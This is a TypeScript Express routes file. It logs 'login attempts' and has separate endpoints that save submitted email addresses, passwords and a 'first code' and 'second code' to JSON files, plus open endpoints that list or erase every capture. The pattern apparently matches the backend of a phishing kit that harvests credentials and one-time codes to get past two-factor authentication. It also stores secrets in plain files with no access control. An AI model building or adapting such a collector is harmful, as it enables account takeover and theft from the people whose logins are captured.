import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertLoginAttemptSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Log login attempt
  app.post("/api/login-attempts", async (req, res) => {
    try {
      const validatedData = insertLoginAttemptSchema.parse(req.body);
      const attempt = await storage.logLoginAttempt(validatedData);
      res.json(attempt);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Failed to log attempt" });
      }
    }
  });

  // Get all login attempts (for debugging/admin purposes)
  app.get("/api/login-attempts", async (req, res) => {
    try {
      const attempts = await storage.getLoginAttempts();
      res.json(attempts);
    } catch (error) {
      res.status(500).json({ message: "Failed to retrieve attempts" });
    }
  });

  // Clear all login attempts
  app.delete("/api/login-attempts", async (req, res) => {
    try {
      await storage.clearLoginAttempts();
      res.json({ message: "All login attempts cleared" });
    } catch (error) {
      res.status(500).json({ message: "Failed to clear attempts" });
    }
  });

  // Save email data to separate JSON file
  app.post("/api/save-email", async (req, res) => {
    try {
      await storage.saveEmailData(req.body);
      res.json({ message: "Email data saved" });
    } catch (error) {
      res.status(500).json({ message: "Failed to save email data" });
    }
  });

  // Save password data to separate JSON file
  app.post("/api/save-password", async (req, res) => {
    try {
      await storage.savePasswordData(req.body);
      res.json({ message: "Password data saved" });
    } catch (error) {
      res.status(500).json({ message: "Failed to save password data" });
    }
  });

  // Save first code data to separate JSON file
  app.post("/api/save-first-code", async (req, res) => {
    try {
      await storage.saveFirstCodeData(req.body);
      res.json({ message: "First code data saved" });
    } catch (error) {
      res.status(500).json({ message: "Failed to save first code data" });
    }
  });

  // Save second code data to separate JSON file
  app.post("/api/save-second-code", async (req, res) => {
    try {
      await storage.saveSecondCodeData(req.body);
      res.json({ message: "Second code data saved" });
    } catch (error) {
      res.status(500).json({ message: "Failed to save second code data" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
